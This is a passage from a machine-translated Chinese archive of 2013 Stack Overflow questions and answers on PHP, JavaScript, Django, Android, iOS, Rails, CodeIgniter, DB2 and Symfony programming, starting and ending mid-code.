        if($_SERVER['REQUEST_METHOD'] == 'POST')
{
if($_POST['txtUsername']=='')
{
  echo "onload = 'showMessage("VALUE")'";    
}
}
?> > // end of body start tag

 <form action="login.php" method="POST">

 Username <input type="text" size="30" name="txtUsername" id="user" /><br />

 Password <input type="password" size="30" name="txtPassword" id="pass" /><br />

 <input type="submit" value="Login" name="loginSubmit"/>

</form>
</body>

<script type="text/javascript">

   function showMessage(value)
   {
    document.getElementById(value).innerHTML= value+"can not be empty."; 
   }
   </script> 
```

如果验证成功，则 php 代码不会回显任何内容，并且不会调用 javascript 函数。为我工作:)。告诉我这是否有帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-20T10:13:11.607

```
 <?php

    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
      if($_POST['txtUsername']=='')
      {
      ?>
          <script>
             //Define the function somewhere in the top or in external js and include it.
            callyourfunction();
          </script>
      <?php
      }
    }
?>              //Its not working 
```

# sql - SQL Management Studio 导出数据

> ID：14977152
> 
> 赞同：0
> 
> 时间：2013-02-20T10:09:06.100
> 
> 标签：sql, export, mdf

我目前在 Management Studio 上有一个 mdf 数据库，我想将数据导出到一个 sql 文件。使用数据源导出数据：SQL Server Native Client 工作正常，但我不知道他将导出的数据保存在哪里。有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T14:05:08.173

您需要进入数据库-> 任务-> 生成脚本。

在那里选择选项，您将能够在 SQL 脚本中生成完整的数据库

# javascript - 使用 $(document).ready(function() 访问另一个 js 文件中的函数

> ID：14977156
> 
> 赞同：0
> 
> 时间：2013-02-20T10:09:11.230
> 
> 标签：javascript, jquery, html, css

根据这篇文章[点击这里查看引用的帖子](https://stackoverflow.com/questions/4335069/calling-a-javascript-function-from-another-js-file)

我试图访问在 post 指令之后在另一个 .js 文件中定义的函数。但是，我仍然有一个问题。请参阅下面的代码：

**sildemenu.js**

```
$(document).ready(function() {
    var window.slideMenu=function(){
        //do something here 
    }();
}); 
```

**控制.js**

```
$(document).ready(function() {
    $('#foo').on('click', function() {
         window.slideMenu();
    });
}); 
```

我收到错误“对象 [对象窗口] 没有方法 'sildeMenu'”。我对编程很陌生。请给我一个怜悯。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:11:47.800

您尝试定义一个复杂的变量（这种方式是不可能的）而不是为全局对象赋值 - `window`。

```
 var window.slideMenu=function(){
//^^^ Get rid of this
    //do something here 
  }();
 //^^  and remove this 
```

并摆脱`var` **固定代码：**

```
window.slideMenu=function(){
    //do something here 
}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-12-13T12:38:37.527

不需要窗口对象，只需编写：

**sildemenu.js**

```
$(document).ready(function() {
    slideMenu=function(){
      //Do your stuff here!
    };
}); 
```

**控制.js**

```
$(document).ready(function() {
    $('#foo').on('click', function() {
         slideMenu();
    });
}); 
```

# django - 在 django-crispy-forms 中创建控件行

> ID：14977157
> 
> 赞同：6
> 
> 时间：2013-02-20T10:09:14.543
> 
> 标签：django, django-forms, django-crispy-forms

使用[django-crispy-forms](https://github.com/maraujop/django-crispy-forms)我想在一行中组合两个（或更多）小部件。另见附件示例。我认为应该可以使用该库，尽管文档确实包含有关此问题的示例并且源代码也没有帮助。那么有没有人设法使用[django-crispy-forms](https://github.com/maraujop/django-crispy-forms)获得类似的结果？

![示例控件行](../Images/109e1f5fb8e07ba2bddd3f82998d1847.png)

这种表单所需的 HTML 如下所示：

```
<div class="control-group">
    <label for="desc" class="control-label">
        Description
    </label>
    <div class="controls controls-row">
        <input class="span2" maxlength="255" type="text" id="desc">
        <input class="span3" maxlength="255" type="text">
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-20T15:23:12.710

是的。使用[布局](http://django-crispy-forms.readthedocs.org/en/latest/layouts.html)

这是一个示例片段，可以帮助您进行操作。

```
def __init__(self, *args, **kwargs):
    self.helper = FormHelper()
    self.helper.form_method = 'get'
    self.helper.form_id = 'id_search'
    self.helper.layout = Layout(
            Div(
                Div(Field('arrival_date', css_class='span12 input-large calendar',
                    placeholder='dd/mm/yyyy'), css_class='span5'),
                Div(Field('departure_date', css_class='span12 input-large calendar',
                    placeholder='dd/mm/yyyy'), css_class='span5'),
                Div(Field('rooms', css_class='span12'), css_class='span2 styled-rooms'),
                css_class='row-fluid',
            ),
        ) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-20T14:54:42.683

你可以在 `def **init** (self, *args, **kwargs): in layout object 中定义 HTML 对象。此 HTML 将为您提供满足您需求的所有自由。

还有另一种方法。要在模板文件夹中实际制作自己的模板，然后在布局对象中定义该模板的路径示例：

```
Field('name', template='path/to/template/single_line_input.html'), 
```

其中“名称”实际上是一个小部件。

当然，您总是可以尝试在您的应用程序的 CSS 文件中进行操作，类似`float: left`或`display: inline`可能会有所帮助，但是您必须在应该内联显示的小部件上定义类。对于不熟悉前端 CSS 的人来说，这可能有点棘手（因为结果在不同的浏览器和不同的分辨率下可能会有所不同，所以不用说需要进行一些测试）。您遇到的问题主要是浏览器默认将输入字段呈现为块对象，因此即使它们的宽度较小，它们也会占用一行中的所有空间。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-02T18:49:50.347

您可以使用`MultiValueField`and`MultiWidget`来获得这种行为。您需要考虑并修改`compress`and`decompress`方法，但类似以下的内容应该可以帮助您实现部分目标。

```
from django import forms
from crispy_forms.helper import FormHelper

class MyWidget(forms.MultiWidget):
    widgets = (forms.TextInput(), forms.TextInput())
    super(ExpirationDateWidget, self).__init__(widgets)

    def decompress(self, value):
        if value:
            return value.split('|')  # or however you combined the two values
        return [None, None]

class MyMultiField(forms.MultiValueField):
    def __init__(self, *args, **kwargs):
        self.widget = MyWidget(*args, **kwargs)

    def compress(self, data_list):
        return data_list[0] + '|' + data_list[1]  # or other logical compression

class MyForm(forms.Form):
    multi_field = MyMultiField()
    # other fields like category and category_new

    def __init__(self, *args, **kwargs):
        self.helper = FormHelper()
        self.helper.form_class = 'form-horizontal'
        self.helper.layout = Layout('multi_field', 'category', 'category_new') 
```

这将导致类似：

```
 <div id="div_id_multi_field" class="control-group">
     <label for="id_multi_field_0" class="control-label">Multi Field</label>
     <div class="controls">
         <input id="id_multi_field_0">
         <input id="id_multi_field_1">
     </div>
 </div> 
```

# android - 字符串的文件路径

> ID：14977158
> 
> 赞同：0
> 
> 时间：2013-02-20T10:09:15.410
> 
> 标签：android, file, path

我正在尝试将图像文件的完整路径作为字符串获取，但它不起作用。我只是得到像“内容：/外部/媒体/图像/1”这样的结果。这绝对不是正确的道路。如何获得正确的路径，包括文件扩展名？

这是我到目前为止所尝试的：

```
 public void onClick(View arg0) {
                switch (arg0.getId()) {
                case R.id.btnGetImage:
                    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                     intent.setType("image/*");
                     startActivityForResult(Intent.createChooser(intent, "Select A Picture"),  
                               PHOTO_GALLERY);
                    break;
         }
 } 
```

* * *

```
@Override
        protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         switch(requestCode){
         case PHOTO_GALLERY:
             if (resultCode == RESULT_OK) {
                 File file = new File(data.getDataString());
                 String imagePath = file.getAbsolutePath();
                 break;
             }
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:14:15.913

试试这个代码：

```
case R.id.btnGetImage:

        Intent i = new Intent(
                Intent.ACTION_PICK,
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivityForResult(i, RESULT_LOAD_IMAGE);
        break; 
```

和

```
 @Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    if (requestCode == RESULT_LOAD_IMAGE && resultCode == RESULT_OK
            && null != data) {
        Uri selectedImage = data.getData();
        String[] filePathColumn = { MediaStore.Images.Media.DATA };

        Cursor cursor = getContentResolver().query(selectedImage,
                filePathColumn, null, null, null);
        cursor.moveToFirst();

        int columnIndex = cursor.getColumnIndex(filePathColumn[0]);
        picturePath = cursor.getString(columnIndex);
        cursor.close();

        ImageView imageView = (ImageView) findViewById(R.id.imageView1);
        imageView.setImageBitmap(BitmapFactory.decodeFile(picturePath));

    } 
```

picturePath 是您所需的路径...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:14:48.200

```
 protected void onActivityResult(int requestCode, int resultCode, Intent data) {
     switch(requestCode){
     case PHOTO_GALLERY:
         if (resultCode == RESULT_OK) {
             Uri selectedImageUri = data.getData();
        String selectedImagePath = getRealPathFromURI(selectedImageUri);
             File file = new File(selectedImagePath );

             break;
         }
    }
 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:22:58.123

您已经定义了正确`filename`的路径，该路径必须存在于您的 sdcard 中，同时从 sdcard 中获取，

> 字符串文件路径 = Environment.getExternalStorageDirectory()+"/foldername/"+test.png;

我闻到你试图做这样的[事情](https://stackoverflow.com/a/13506238/646806)。

# highcharts - highcharts 是否支持黑莓 10？

> ID：14977161
> 
> 赞同：0
> 
> 时间：2013-02-20T10:09:35.740
> 
> 标签：highcharts

我创建了示例 bb10 webworks 应用程序，它显示图表（饼图、线条、条形图等）。我也使用了 highcharts 库。示例图表显示在 bb10 设备上，但某些时间图表未正确呈现。有时图表是空的。在 highcharts 文档中，他们没有提到对 Blackberry 10 的兼容性。所以我需要知道“它是否完全支持 BB10？”。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:17:06.460

此处提供完全兼容性：[http ://www.highcharts.com/documentation/compatibility](http://www.highcharts.com/documentation/compatibility)

# ios - 我什么时候应该使用导航控制器？

> ID：14977164
> 
> 赞同：21
> 
> 时间：2013-02-20T10:09:46.647
> 
> 标签：ios, objective-c, uinavigationcontroller, segue

我不知道什么时候应该使用导航控制器而不是使用 segue 和普通视图控制器？如果使用 segue，Modal 和 Push segue 有什么不同？

你可以给我一个例子吗？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2015-12-07T22:39:33.330

简短回答：**使用带有“show”segues 的导航控制器仅用于实现 DRILL DOWN 行为。**

例如，导航控制器→作者→书籍→书籍

*   对于“根”（作者）下的每个级别，导航控制器会*自动*添加标题栏和后退按钮。所以在 Books 上，后退按钮会自动命名为“<Authors”。

*   子视图控制器**必须与 SHOW segues 连接——show** segues 告诉导航控制器“这是父子关系”并导致预期的从右侧滑入过渡。（要跳出层次结构，例如，书籍→登录，请改用模态转场。）

*   根 View Controller 有一个导航栏，您可以向其中添加更多栏按钮，但子 View Controller 没有，因为它是自动添加的。

## FoodTracker 示例

现在可以解释Apple 的[开始开发 iOS 应用程序 (Swift)](https://developer.apple.com/library/ios/referencelibrary/GettingStarted/DevelopiOSAppsSwift/)中 FoodTracker 教程的奇怪布局。**第二个嵌套导航控制器怎么了？它只是一个简单的餐食列表：点击餐食以在餐食详情中显示，或点击添加到餐食详情变成添加餐食。

[FoodTracker 故事板](http://i.stack.imgur.com/SBfyK.png)

*   第一个 Navigation Controller 使 My Meals 成为向下钻取层次结构的根，用于从那里“推送”的任意数量的视图（不需要进一步的 Navigation Controller 来执行此操作）。

*   但是，Meal Detail 用于显示现有餐点和添加新餐点。要添加新餐点，需要取消和保存按钮。第二个导航控制器允许通过将 Meal Detail 设为根来添加这些按钮（参见上面的第 3 点）。

*   显示现有的餐点是一种推送选择，但添加餐点是一种模态选择（新餐点不是向下钻取）。这很重要：不能只按添加餐食的原因是自动后退按钮（“<我的餐食”）变得不明确：它是保存还是取消？

因为“导航”和“推送”是非常笼统的术语，并且因为获得免费的后退按钮很好，所以很容易认为导航控制器可以从任何地方移动到任何地方，但该行为仅用于分层遍历。

（这是一个老问题，但作为 iOS n00b，我也对此感到困惑，就像 OP 一样，我仍然有问题。）

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-20T10:15:43.323

以我的经验，没有一个通用的规则来决定这种事情，这取决于你未来应用程序的可用性......

导航控制器帮助用户记住他们在每一刻的位置，以及他们如何返回，但如果你有太多的关卡，这不是最好的选择......更重要的是，如果你使用的是 NavigationController 或一个 TabBarController，你有一个类，可以从所有其他 ViewController 访问，你可以在其中拥有一般功能或数据......

modal 和 push segue 之间的区别在于，在第一个过程中，您将始终返回父 ViewController，因为您只在顶部显示新信息，而在 push 中，您将一个 ViewController 替换为另一个...

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-20T10:13:03.837

当您想要启用后退按钮功能时，您可以使用导航控制器。您仍然使用“普通”视图控制器，只是将它们嵌入导航控制器中。然后，您可以推送视图控制器并返回。

# xml - XElement.Descendants () 使其不区分大小写

> ID：14977166
> 
> 赞同：4
> 
> 时间：2013-02-20T10:09:50.917
> 
> 标签：xml, linq, xpath, xelement, descendant

XElement.Descendants () 方法接受要查找的元素的名称。

但它是区分大小写的有没有办法让它不区分大小写

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-20T10:11:55.397

你可以使用这个：

```
element.Descendants()
       .Where(x => string.Compare(x.Name, filter,
                                  StringComparison.OrdinalIgnoreCase) == 0); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-09T09:39:17.430

这种方式对我有用..

```
XElement selectedElement = doc.Descendants().Where(x => 
String.Equals((string)x.Attribute("name"), filtertext, 
StringComparison.InvariantCultureIgnoreCase)).FirstOrDefault(); 
```

# ruby-on-rails - 无法从 Rails 调用/运行/执行 ruby 脚本

> ID：14977175
> 
> 赞同：1
> 
> 时间：2013-02-20T10:10:07.523
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, rubygems

我想运行一个 ruby​​ 脚本，该脚本将由控制器后的方法调用。执行控制器时，我们知道当前路径位于项目的根目录。

FullScanTest.rb ：我想调用的脚本。我可以在 bash shell 中运行以下命令，但不能在 rails ruby​​ 中调用 ./public/ruby_lib/af/FullScanTest.rb -i 172.16.178.178 -s 25_10_1 -f auto 所以我写了一个简单的 ruby​​ 脚本，它只回复一个字符串。它确实有效~ ruby​​ ./public/ruby_lib/af/test.rb 它适用于 bash-shell 和 rails。

那么问题是什么？允许？环境 ？

提前谢谢大家~当我们在 ROR 上调用脚本时，无论如何都会得到错误输出，我认为它没有显示错误消息。

我发现 ruby​​ 脚本在 require 'mechanize' 和 'nokogiri' 处停止。（所以我标记它们〜它们不会在我的应用程序中使用）但是脚本也停止在预期之外的某个地方，是否有任何限制运行脚本？该脚本将运行数小时。我可以`ruby ./public/ruby_lib/af/FullScanTest.rb -i 172.16.178.178 -s 25_10_1 -f auto` 在prj_root下执行命令

```
 require 'open-uri'
  require 'rubygems'

  require 'mechanize'

  require 'logger'
  require 'time'
  require 'nokogiri'
  require 'pp' 
```

** 当我通过控制器调用 ruby​​ 脚本时，是否有人显示错误？我很难调试，它没有显示任何信息。**

```
def aftest

af_lib="./public/ruby_lib/af/"
prog="FullScanTest.rb"
prog2="test.rb"
params="-i 172.16.178.178 -s 25_10_1 -f auto "
cmd = " ruby #{af_lib}#{prog} #{params}  "
@cmd = %x[ echo #{cmd} ]
res1 = %x[ ruby #{af_lib}#{prog} ]
res2 = %x[ ruby #{af_lib}#{prog2} #{params} --force 2>&1 ]
@res1 = "#{res1}"
@res1 = "#{res2}"

end 
```

我使用视图显示输出，但没有显示任何错误

```
<h1>Af test lala</h1>

<%= form_tag :action => 'update', :id => @some_object %>
<%= form_tag( { :action => :save, }, { :method => :post }) %>
<h2>Command</h2>
<%= @cmd %>
<h2>Results</h2>
<%= @res1 %>
<h3>H3</h3>
<%= @res2 %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T16:28:11.477

你怎么调用脚本。认为有效的脚本和无效的脚本之间的唯一区别是无效的脚本有参数？？？

你使用系统调用脚本吗？

IE

```
system("./public/ruby_lib/af/FullScanTest.rb","-i","172.16.178.178","-s","25_10_1","auto") 
```

甚至更好

```
path = "#{Rails.root}/public/ruby_lib/af/FullScanTest.rb"
system(path,"-i","172.16.178.178","-s","25_10_1","auto") 
```

# .htaccess - 如何仅在具有 htaccess 的某些页面上启用 https，同时从 Codeigniter 中的 URL 中删除 index.php？

> ID：14977178
> 
> 赞同：0
> 
> 时间：2013-02-20T10:10:14.630
> 
> 标签：.htaccess, codeigniter

我用过这段代码

```
Options +FollowSymLinks
RewriteEngine on

# redirect for http /buy page
RewriteCond %{SERVER_PORT} =80
RewriteRule ^buy/?$ https://mysite.com/buy [R=301,QSA,L,NE]

# redirect for https non /buy pages
RewriteCond %{SERVER_PORT} =443
RewriteCond %{REQUEST_URI} !^/buy [NC]
RewriteRule ^/?(.*)$ http://mysite.com/$1 [R=301,QSA,L,NE] 
```

这适用于 https 重定向，但我也想从我的 URL 中删除 index.php。这是代码：

```
RewriteCond %{REQUEST_URI} ^/system.*
RewriteRule ^(.*)$ index.php?/$1 [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.+)$ index.php?/$1 [L] 
```

我怎样才能加入这两个代码。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:28:00.520

你可以在代码中做到这一点。

创建一个辅助函数；就像是

```
if ( ! function_exists('force_ssl')) {
    function force_ssl() {
        $CI =& get_instance();
        $CI->config->config['base_url'] = str_replace('http://', 'https://', $CI->config->config['base_url']);
        if ($_SERVER['SERVER_PORT'] != 443) {
            redirect($CI->uri->uri_string());
        }
    }
} 
```

然后只需在您想要的控制器的构造中调用此函数。

例如

```
public function __construct() {
        parent::__construct();
        force_ssl();
} 
```

# javascript - 添加到 innerHTML 正确的语法

> ID：14977179
> 
> 赞同：0
> 
> 时间：2013-02-20T10:10:17.893
> 
> 标签：javascript, innerhtml

如果我想使用 innerHTML 向元素添加内容，正确的语法是什么？以下是我的非工作示例：

```
 openNewWindow: function(content) {
popupWin = window.open(content,
    'open_window',
    'menubar, toolbar, location, directories, status, scrollbars, resizable, dependent, width=640, height=480, left=0, top=0')
},

for (var index in mv.exifImages) {
        ele.innerHTML += "<p onclick = openNewWindow(mv.exifImages[index]> image" + index + "</p>";
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:14:04.590

我觉得是这样的。变量`index`具有局部范围

```
for (var index in mv.exifImages) {
        ele.innerHTML += "<p onclick = 'openNewWindow(\"" + mv.exifImages[index] + "\")'> image" + index + "</p>";
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:14:03.357

使用`appendChild`：

```
var myelement = document.getElementById("myelement");
myelement.appendChild( document.createTextNode("Example text inside myelemen") ); 
```

这比覆盖 innerHTML 更好，因为它保留了 onclick 事件，例如：
[是否可以在不破坏后代事件侦听器的情况下附加到 innerHTML？](https://stackoverflow.com/questions/595808/is-it-possible-to-append-to-innerhtml-without-destroying-descendants-onclick-fu)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:59:43.973

innerHTML 不是您的问题，您的代码缺少上下文。

```
 openNewWindow: function(content) {
        popupWin = window.open(content,
            'open_window',
            'menubar, toolbar, location, directories, status, scrollbars, resizable, dependent, width=640, height=480, left=0, top=0');
        // call to window.open ended here
    },
    // judging by the definition of openNewWindow and the comma above,
    // we are inside an object definition!

    // you cannot embed a for loop inside an object definition!!!
    for (var index in mv.exifImages) {
        ele.innerHTML += "<p onclick = openNewWindow(mv.exifImages[index]> image" + index + "</p>";
    } 
```

将您的 for 循环放在合理的地方，例如在函数内部，或者实际向我们展示您遇到的错误。

# html - 使用媒体查询在各种 h1 标题之间交换时具有语义

> ID：14977184
> 
> 赞同：0
> 
> 时间：2013-02-20T10:10:26.677
> 
> 标签：html, css, media-queries, semantics

我正在创建一个即将推出的页面，但希望 h1 标题随着屏幕宽度的变化而具有不同的标题。这是我的问题：

```
 <h1 class="hide1">HOLD ONTO YOUR HATS</h1>
 <h1 class="hide2">COMING SOON</h1>
 <h1 class="hide3">ON ITS WAY</h1>
 <h1 class="hide4">PENDING</h1>
 <h1 class="hide5">NIGH</h1> 
```

...接着：

```
 @media only screen and (min-width : 1200px) {
      .hide2, .hide3, .hide4, .hide5 {
         display: none;
      }
 } 
```

这一切都有点切碎和黑客攻击在一起。

有没有一种更语义化的方式来做到这一点，1，在源代码中隐藏其他 h1 和 2，从屏幕阅读器中隐藏其他 h1？

谢谢

编辑：标题有点混乱，所以它已经改变了

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T15:31:58.330

好吧，我似乎无法以一种有意义的方式质疑某些事情，我猜是将来要研究的事情。

因此，在过去几天的工作之后，我想我可能已经找到了一个不那么 hacky 的解决方案。

```
 <h1><span class="main__header--changer">COMING SOON</span></H1> 
```

...和CSS

```
 @media (max-width: 75em) {
      h1:before {
           content: "HOLD ONTO YOUR HATS";
      }

      .main__header--changer {
           display: none;
      }
 } 
```

唯一的问题是虽然屏幕阅读器将无法阅读标题。

# jdbc - 使用 @JdbcInsert 时检索自动增量值

> ID：14977185
> 
> 赞同：0
> 
> 时间：2013-02-20T10:10:30.473
> 
> 标签：jdbc, xpages, xpages-extlib, xpages-ssjs

我试图在主键是自动增量的 DB2 数据库表中存储一行。这工作正常，但我无法在成功插入行后如何检索主键值以进行进一步处理。你如何做到这一点？@JdbcInsert 只返回插入的行数......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T18:58:11.760

由于似乎没有办法使用 SSJS（至少对我而言），因此我将这段特定的逻辑从我的 SSJS 控制器移到了我为 JDBC 相关任务创建的 Java 助手 bean。[语句](http://docs.oracle.com/javase/1.4.2/docs/api/java/sql/Statement.html)能够返回生成的密钥（使用方法executeUpdate *()*）。所以我仍然通过@JdbcGetConnection 创建我的连接，然后将它交给bean。这是 bean 的有趣部分：

```
/**
 * SQL contains the INSERT Statement
 */    
public int executeUpdate(Connection conn, String SQL){

  int returnVal;
  Statement stmt = conn.createStatement();

  stmt.executeUpdate(SQL,
    Statement.RETURN_GENERATED_KEYS);

  if(!conn.getAutoCommit()) conn.commit();

  ResultSet keys = stmt.getGeneratedKeys();

  if(keys.next()){
    returnVal = keys.getInt(1);
  } else {
    returnVal = -1;
  }

  return returnVal;
} 
```

如果一次插入多行，当然需要更改键检索处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T14:11:46.707

在较新的 DB2 版本中，您可以将每个 Insert 转换为 Select 以获取自动生成的键列。一个例子是：

从 Final Table 中选择 keycol（插入表（col1，col2）值（？，？））

keycol 是您的身份列的名称

Select 可以使用与您通常的查询相同的 @Function 执行。

# cocoa - 如何区分 NSOperationQueue 中的多个 NSXMLParser

> ID：14977186
> 
> 赞同：0
> 
> 时间：2013-02-20T10:10:38.253
> 
> 标签：cocoa, nsxmlparser, nsoperationqueue

我有多个`NSXMLParser`. `NSOperationQueue`当`NSXMLParser`调用时`parserDidEndDocument`我需要区分 thou 解析器。我以为我可以使用类似的东西，`userInfo`但没有这样的东西。有什么方法可以区分解析器吗？

编辑： Thou 解析器具有相同的校准委托`parserDidEndDocument`

结论：

```
@interface MyParser : NSXMLParser
@property (nonatomic, retain) NSString *action;
@end

@implementation MyParser
@synthesize action=_action;
@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:29:00.150

如果您阅读[文档](http://developer.apple.com/library/ios/#documentation/cocoa/reference/NSXMLParserDelegate_Protocol/Reference/Reference.html)，您会看到解析器本身是作为该方法的唯一参数传递的，因此区分它们的简单方法是简单地检查传递的解析器。

为了使其工作，您可能必须保留对您创建的解析器的引用以供将来参考，但这通常不一定是一个坏主意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T13:57:19.350

NSOperation 子类可以发布自己的通知。其他一些类只需要注册为观察者。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-21T08:46:22.387

我得出的结论是，最好的方法是专业化`NSXMLParser`.

```
@interface MyParser : NSXMLParser
@property (nonatomic, retain) NSString *action;
@end

@implementation MyParser
@synthesize action=_action;
@end 
```

# symfony - 配置文件更改时出现 FOS UserBundle 错误

> ID：14977187
> 
> 赞同：0
> 
> 时间：2013-02-20T10:10:44.467
> 
> 标签：symfony, fosuserbundle

我将 symfony 2.0 与 fos 用户捆绑包一起使用，当涉及到配置文件更改时，我得到了一个非常奇怪的行为：

在我的用户实体中，我使用 FOSValidator，如下所示：

```
@FOSValidator\Unique(property="usernameCanonical", message="fos_user.username.already_used", groups={"Facebook", "profile_username"}) 
```

在我的 ProfileController 中

表单通过验证

```
$form = $this->container->get('form.factory')->create(new ProfileSimpleFormType(array($field)), $user);
        $session = $this->container->get("session");
        if ($this->container->get('request')->getMethod() == 'POST') {
            $form->bindRequest($this->container->get('request'));
            if ($form->isValid()) {

                    $this->container->get('fos_user.user_manager')->updateUser($user);

                    return $this->container->get('templating')->renderResponse('FOSUserBundle:Profile:show_field.html.' . $this->container->getParameter('fos_user.template.engine'), array(
                        'field' => $field,
                        'user' => $user
                    ));
//                }
            }else{
                $user2 = $this->container->get('security.context')->getToken()->getUser();
            }
        } 
```

但现在到了奇怪的行为：

如果由于用户名存在而导致表单无效，则 $user2 使用现有用户名设置用户，因此我可以通过更改用户名来劫持其他帐户。

我试图调试一种视图类型的侦听器，但我找不到将现有用户名设置为安全令牌的点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T08:39:54.640

我自己解决了这个问题。解决方案是告诉用户管理器通过以下方式重新加载用户：

```
$this->container->get('fos_user.user_manager')->reloadUser($user); 
```

# php - 如何在php中使值达到给定字符串的一定长度

> ID：14977192
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:10:54.620
> 
> 标签：php, regex

我有一个如下字符串：

**例如：**

```
$string = "A great way to start with your theme is to use the XML export file from the demo. Having this starting content makes it easier to see how some features are created. Download the demo content below and import it into your WordPress site to get a replica of the theme demo site.The second step is to navigate to the Tools options and click Import. Then on the bottom of the list."; 
```

现在我需要将内容增加到 3 行，它应该是一个完整的句子。所以我想知道我该怎么做。PHP中是否有任何功能可以做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:34:28.730

这应该从一些基本的正则表达式开始。您应该继续重新测试正则表达式的有效性，并在遇到特殊情况时对其进行调整。您无法真正防范任何事情（例如对您的问题的评论中所说的丝绸之火）。

```
<?php
$string = "A great way to start with your theme is to use the XML export file from the demo. Having this starting content makes it easier to see how some features are created. Download the demo content below and import it into your WordPress site to get a replica of the theme demo site.The second step is to navigate to the Tools options and click Import. Then on the bottom of the list.";

$result = preg_match_all("/(?:\w+\s)+(?:\w+\.\s|\w+\.[a-z](?:\w+\s)+(?:\w+\.)+)/", $string, $matches);

echo '<pre>';
print_r($matches);
echo '</pre>';
?> 
```

问题在于您的字符串，您永远不知道代码逻辑中的“lastword.Wordofnewline”是什么。上面的正则表达式本身实际上是相同的。这将只匹配其中一种情况，就像这个字符串 where`replica`变成`repli.ca`：

> 从您的主题开始的一个好方法是使用演示中的 XML 导出文件。拥有此起始内容可以更轻松地查看某些功能是如何创建的。下载下面的演示内容并将其导入您的 WordPress 站点，以获取主题演示站点的 repli.ca。第二步是导航到“工具”选项并单击“导入”。然后在列表的底部。

您确实必须根据大量测试自定义正则表达式，然后才能使其正常工作。如果可能（如果是这种情况），您应该让您的用户（作者）验证您的代码自动编辑的输出:)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T12:14:49.697

您需要格式化字符串，使其具有 /n 或 . 在每个句子之后，您可以拆分字符串（php 爆炸功能）。任何奇怪的东西，比如 49.99 英镑或“博士”。john Smith' 会破坏算法。

# ruby-on-rails - Rails omniauth-facebook 未解决的问题

> ID：14977195
> 
> 赞同：10
> 
> 时间：2013-02-20T10:11:10.083
> 
> 标签：ruby-on-rails, facebook-javascript-sdk, omniauth

当前的omniauth-facebook似乎有一些问题，我想知道是否有人对此有答案。

第一个问题是**无效凭据**问题。由于这个问题，我无法使用客户端授权登录到我的应用程序。但是，这可以通过将 facebook-omniauth 降级到 1.4.0 版本来解决。[（参考](https://stackoverflow.com/questions/11597130/omniauth-facebook-keeps-reporting-invalid-credentials)）

但是，现在我遇到了第二个问题**NoAuthorizationCodeError**，并带有错误消息：

```
OmniAuth Strategies Facebook NoAuthorizationCodeError 
(must pass either a `code` parameter or a signed request 
(via `signed_request` parameter): 
```

这是在[这里](https://stackoverflow.com/questions/12370056/omniauth-strategies-facebook-noauthorizationcodeerror-must-pass-either-a-code)提出的，但接受的答案建议实际上再次**升级**到 1.4.1 版本，这会使之前的无效凭据问题再次发生。所以这对我来说不是一个选择。

`NoAuthorizationCodeError`当我尝试通过**internet explorer**登录 Facebook iFrame 内的应用程序（从应用程序中心搜索我的应用程序）时，就会发生这种情况。在 chrome 或 firefox 上一切正常。还有一个[github issue](https://github.com/mkdynamic/omniauth-facebook/issues/56)准确地指出了这个问题，但还没有人想出答案。我也尝试降级到omniauth-facebook 1.3.0 版本，但没有任何区别。我还尝试传递`signed_request`如下参数：

```
window.location = '/auth/facebook/callback', 
{ signed_request: response.authResponse.signedRequest } 
```

但是，它没有任何区别（在 IE 上，错误仍然存​​在），我不确定这是否是将代码作为参数传递的正确方法（我如何检查？）

我认为我的设置没有问题。我真的很感激在这件事上的任何帮助。

*更新：*

我升级到 1.4.1 版本时没有出现无效凭据问题，但是当我通过 Internet Explorer 访问 Facebook 内部的应用程序时，仍然会出现 NoAuthorizationCodeError。检查我的 Github[问题](https://github.com/mkdynamic/omniauth-facebook/issues/110)。

**更新：**

我降级到 1.4.0 版本，并添加了 signedRequest 参数。

```
<script>
function login() {
  FB.login(function(response) {
    if (response.authResponse) {
